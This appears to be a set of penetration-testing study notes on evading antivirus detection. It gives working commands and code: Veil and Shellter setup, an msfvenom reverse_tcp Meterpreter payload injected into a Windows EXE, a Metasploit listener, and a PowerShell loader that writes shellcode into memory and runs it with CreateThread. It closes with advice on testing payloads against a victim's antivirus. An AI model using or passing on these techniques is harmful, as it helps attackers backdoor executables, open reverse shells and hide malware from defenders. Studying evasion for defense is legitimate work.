# Antivirus Evasion

#### How Antivirus detect malicious code

* **signature-based detection** → to bypass we work to obfuscation of code
* **Heuristic-based detection** → depend on rules or analyze of sources code which search on specific bits
* **Behavioral-based detection** → run malware on sandbox and start to scan behavior
* **Machine Learning Detection →** uses algorithms trained on vast amounts of data to identify malware. The system learns to distinguish between legit and malicious files by collecting and analyzing additional metadata.

#### bypass Antivirus detection

* **on-disk evasion**
  * **packers** → compress or encrypt the malware payload. which work on first generation of antivirus
  * **obfuscator** →modify the malware’s code so that it appears harmless to signature-based detection tools. [https://obfuscator.io/](https://obfuscator.io/)
  * **crypters** → which encrypt source code
  * **software protectors** → close all reverses tools
* **im-memory evasion**
  * **Remote process memory injection** → we use API like `OpenProcessAPI`
  * **Reflective DLL injection**

***

#### Tools for AV Evasion

*   **Veil Framework**

    Framework which responsible on antivirus evasion

    ```bash
    git clone <https://github.com/Veil-Framework/Veil.git>
    cd Veil
    ./config/setup.sh --force --silent
    use Evasion
    # file .bat -> payload
    # .rc send to msfconsole
    msfconsole -r payloadname
    ```

    `netstat -antp` to show all process running in background
*   **Shellter Tool**

    is a **dynamic PE infector** that injects shellcode into Windows executables, bypassing EDR and AV detection. It works through **runtime evasion** to ensure payload stealth.

    ```bash
    sudo apt install wine -y
    wget <https://www.shellterproject.com/Downloads/Shellter.zip>
    unzip Shellter.zip
    cd Shellter
    wine shellter.exe
    ```

    **Steps to inject shellcode**

    1. Run `wine shellter.exe` on Kali.
    2. Choose **Auto Mode** and enable **Stealth Mode**
    3. Select the target **EXE file**
    4.  Generate a shellcode:

        ```bash
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw > shellcode.bin
        ```
    5. Inject shellcode into the EXE.
    6.  start Start **Metasploit listener**:

        ```bash
        msfconsole
        use exploit/multi/handler
        set payload windows/meterpreter/reverse_tcp
        set LHOST 192.168.1.100
        set LPORT 4444
        exploit

        ```

***

#### Techniques for AV Evasion

*   **Process Injection**

    The source code bellow is a PowerShell Cmdlet which defines several Windows API functions.

    These Win API Functions enable memory management allowing manipulate memory and create threads directly. Also, the variables names use to obfuscate the code.

    ```bash
    $code = '
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("msvcrt.dll")]
    public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

    $var2 = Add-Type -memberDefinition $code -Name "iWin32" -namespace Win32Functions -passthru;
    ```

    The source code below shows the usage of the Win API and injecting the shellcode in to the legitimate process memory space.

    ```bash
    [Byte[]];   
    [Byte[]] $var1 = **<shellcode>**

    $size = 0x1000;

    if ($var1.Length -gt 0x1000) {$size = $var1.Length};

    $x = $var2::VirtualAlloc(0,$size,0x3000,0x40);

    for ($i=0;$i -le ($var1.Length-1);$i++) {$var2::memset([IntPtr]($x.ToInt32()+$i), $var1[$i], 1)};

    $var2::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
    ```

***

we use [https://www.virustotal.com/gui/home/upload](https://www.virustotal.com/gui/home/upload) to test payload

> if one AV Detect this payload after period the all AV will detect this payload so the best solution you should know the AV for victim machine and create a virtual lab and start to test your payload in this lab
